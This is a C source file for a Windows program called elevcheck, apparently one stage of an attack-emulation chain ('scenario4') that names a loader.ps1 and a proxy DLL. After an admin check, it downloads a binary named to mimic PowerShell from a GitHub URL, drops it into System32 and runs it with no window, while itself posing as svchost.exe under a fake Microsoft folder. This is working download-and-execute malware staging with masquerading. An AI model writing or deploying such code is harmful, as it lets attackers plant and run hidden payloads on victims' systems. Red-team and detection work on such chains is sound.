#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <urlmon.h>
#include <shlobj.h>

BOOL WINAPI IsUserAnAdmin(void);

static const char *g_tag = "elevcheck.exe";
static const char *g_outPath = "C:\\Windows\\System32\\P0wershell.exe";

/* ponytail: centralized activity.log on the operator's Desktop (shared with
   loader.ps1 / P0wershell.exe / userenv_proxy.dll). */
static void activity(const char *fmt, ...) {
    char path[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) return;
    lstrcatA(path, "\\activity.log");
    FILE *f = fopen(path, "a");
    if (!f) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(f, "[%04u-%02u-%02u %02u:%02u:%02u] [%s] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, g_tag);
    va_list ap; va_start(ap, fmt); vfprintf(f, fmt, ap); va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static void press_exit(int code, const char* why) {
    char buf[256];
    snprintf(buf, sizeof(buf), "elevcheck exiting (%d)\n%s", code, why ? why : "");
    activity("[*] %s", buf);
    MessageBoxA(NULL, buf, "elevcheck", MB_OK | MB_ICONINFORMATION);
    exit(code);
}

int main(void) {
    activity("[+] elevcheck started (stage-2, running as svchost.exe)");

    if (!IsUserAnAdmin())
        press_exit(1, "[-] Not running as admin.");

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (lstrcmpiA(path, "C:\\Program Files\\Microsoft\\svchost.exe") != 0)
        press_exit(1, "[-] Not running from expected path.");

    printf("[+] Running in Elevated Session.\n");
    activity("[+] Elevated session confirmed, path check OK");
    activity("[+] Elevation: IsUserAnAdmin=TRUE (UAC-full token)");

    const char* url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/P0wershell.exe";
    printf("[+] Downloading P0wershell.exe...\n");
    HRESULT hr = URLDownloadToFileA(NULL, url, g_outPath, 0, NULL);
    if (hr != S_OK) {
        printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
        press_exit(1, "[-] P0wershell.exe download failed.");
    }
    printf("[+] Download complete.\n");
    WIN32_FILE_ATTRIBUTE_DATA fa;
    DWORD sz = 0;
    if (GetFileAttributesExA(g_outPath, GetFileExInfoStandard, &fa)) sz = fa.nFileSizeLow;
    activity("[+] P0wershell.exe downloaded (%lu bytes) -> %s", sz, g_outPath);

    /* ponytail: no visible console for the child; parent tree stays quiet */
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, (LPSTR)g_outPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        press_exit(1, "[-] CreateProcess of P0wershell.exe failed.");
    }
    printf("[+] P0wershell.exe launched (PID: %lu) — waiting for completion\n", pi.dwProcessId);
    activity("[+] P0wershell.exe launched (PID: %lu, CREATE_NO_WINDOW)", pi.dwProcessId);
    CloseHandle(pi.hThread);

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    activity("[+] P0wershell.exe exited (code=%lu)", code);
    CloseHandle(pi.hProcess);
    press_exit(0, "[+] Chain completed.");
}
